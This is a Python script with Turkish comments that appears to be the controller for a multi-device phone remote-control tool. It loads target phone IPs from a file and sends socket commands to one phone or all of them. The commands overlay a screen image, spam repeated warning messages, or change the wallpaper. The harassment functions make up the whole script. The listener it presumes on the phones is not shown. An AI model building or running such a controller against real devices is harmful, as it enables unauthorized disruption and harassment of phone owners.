# FphoneMultiSocket.py - Aynı anda birden fazla cihaza socket ile komut gönderme
import socket
import time

# IP listesini dosyadan oku
def cihazlari_yukle(dosya):
    try:
        with open(dosya, "r") as f:
            ipler = [satir.strip() for satir in f.readlines() if satir.strip()]
        return ipler
    except:
        print("[!] IP listesi dosyasi bulunamadi.")
        return []

# Seçim yap
def hedef_sec(ipler):
    print("\n[1] Tüm cihazlara gönder")
    print("[2] Bir cihaza gönder")
    sec = input(">>> ")
    if sec == "1":
        return ipler
    elif sec == "2":
        for i, ip in enumerate(ipler):
            print(f"[{i+1}] {ip}")
        secim = int(input("Seç: "))
        return [ipler[secim - 1]]
    else:
        return []

# Komut belirle
def komut_al():
    print("\n[1] Ekran resim kapla")
    print("[2] Uyarı spam")
    print("[3] Arka plan değiştir")
    print("[4] Hepsi")
    secim = input(">>> ")
    if secim == "1":
        url = input("Resim URL: ")
        return f"telefon {url}"
    elif secim == "2":
        mesaj = input("Uyari mesaj: ")
        adet = input("Kac kez: ")
        return f"uyarispam {mesaj} -m {adet}"
    elif secim == "3":
        url = input("Arka plan URL: ")
        return f"arkaplan {url}"
    elif secim == "4":
        url = input("Resim URL: ")
        mesaj = input("Uyari mesaj: ")
        adet = input("Kac kez: ")
        return f"telefon {url}\nuyarispam {mesaj} -m {adet}\narkaplan {url}"
    else:
        return ""

# Komutu gönder
def komut_gonder(hedefler, port, komut):
    for ip in hedefler:
        try:
            s = socket.socket()
            s.settimeout(2)
            s.connect((ip, port))
            for satir in komut.split("\n"):
                s.send(satir.encode())
                time.sleep(0.5)
                try:
                    cevap = s.recv(4096).decode()
                    print(f"[{ip}] -> {cevap.strip()}")
                except:
                    print(f"[{ip}] -> cevap yok")
            s.close()
        except Exception as e:
            print(f"[{ip}] baglanti hatasi: {e}")

# Ana akış
if __name__ == "__main__":
    print("=== FPHONE MULTI CONTROL ===")
    ip_listesi = cihazlari_yukle("telefonlar.txt")
    if not ip_listesi:
        exit()

    hedefler = hedef_sec(ip_listesi)
    if not hedefler:
        print("[!] Hedef yok.")
        exit()

    port = int(input("Port: "))
    komut = komut_al()
    if not komut:
        print("[!] Komut boş.")
        exit()

    komut_gonder(hedefler, port, komut)
